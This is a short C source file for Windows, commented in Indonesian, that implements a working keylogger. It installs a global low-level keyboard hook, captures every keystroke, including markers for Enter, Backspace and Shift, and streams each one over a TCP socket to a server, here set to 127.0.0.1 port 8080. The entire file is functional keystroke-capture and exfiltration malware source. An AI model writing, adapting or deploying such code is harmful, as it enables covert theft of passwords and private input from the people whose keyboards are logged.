#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib") // Untuk menggunakan Winsock

SOCKET clientSocket;

// Fungsi untuk mengirim data ke server
void send_data(const char *data) {
    send(clientSocket, data, strlen(data), 0);
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lParam;
    if (wParam == WM_KEYDOWN) {
        char buffer[256] = {0};
        switch (pkey->vkCode) {
            case VK_BACK:
                sprintf(buffer, "(BACKSPACE)");
                break;
            case VK_RETURN:
                sprintf(buffer, "(ENTER)");
                break;
            case VK_SPACE:
                sprintf(buffer, "(SPACE)");
                break;
            case VK_LSHIFT:
                sprintf(buffer, "(SHIFT)");
                break;
            default:
                sprintf(buffer, "%c", pkey->vkCode);
                break;
        }
        printf("%s", buffer); // Tampilkan di layar
        send_data(buffer);    // Kirim ke server
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    // Inisialisasi Winsock
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Buat socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        printf("Gagal membuat socket\n");
        return 1;
    }

    // Konfigurasi alamat server
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080); // Port server
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // IP server

    // Hubungkan ke server
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        printf("Tidak bisa terhubung ke server\n");
        return 1;
    }

    printf("Terhubung ke server!\n");

    // Pasang hook
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL) {
        printf("Hook tidak terpasang\n");
        return 1;
    }
    printf("Hook terpasang!\n");

    // Loop pesan
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

